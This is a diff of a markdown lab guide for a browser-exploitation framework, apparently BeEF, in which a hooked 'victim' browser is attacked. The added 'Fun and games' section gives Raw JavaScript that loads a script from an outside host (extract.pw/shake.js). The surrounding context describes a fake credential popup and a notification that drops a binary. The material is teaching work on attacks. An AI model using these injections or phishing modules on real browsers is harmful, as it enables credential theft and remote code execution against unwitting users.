@@ -112,9 +112,6 @@ out where the victim, visiting
 
 ### Trick the victim
 
-Just for fun, play a sound on the victim's computer. Search for *sound* and
-execute the *Play Sound* module.
-
 Next the attacker can trick the victim into divulging secrets. Search for
 _Pretty Theft_ and execute that module. The victim will now see a popup, asking
 to enter a username and password. This is how credentials can be stolen.
@@ -129,6 +126,24 @@ Bar (Chrome)_ module. This will send a notification to the victim. If the victim
 clicks on the notification, it will download a binary file. Note that this step
 will fail (the binary file isn't present on our Attacker server), but this will
 demonstrate how easy it is to trick victims.
+
+### Fun and games
+
+Just for fun, play a sound on the victim's computer. Search for *sound* and
+execute the *Play Sound* module.
+
+Is the sound on? Then we can do better... Search for *raw* and select the *Raw
+JavaScript* module. Paste the following code in the JavaScript Code window:
+
+```
+var b = document.createElement('script');
+b.type = 'text/javascript';
+b.src = 'http://extract.pw/shake.js';
+document.body.appendChild(b);
+```
+Click on *Execute*.
+
+**The attacker successfully executed arbitrary JavaScript**
 
 ### GOD exploit
 
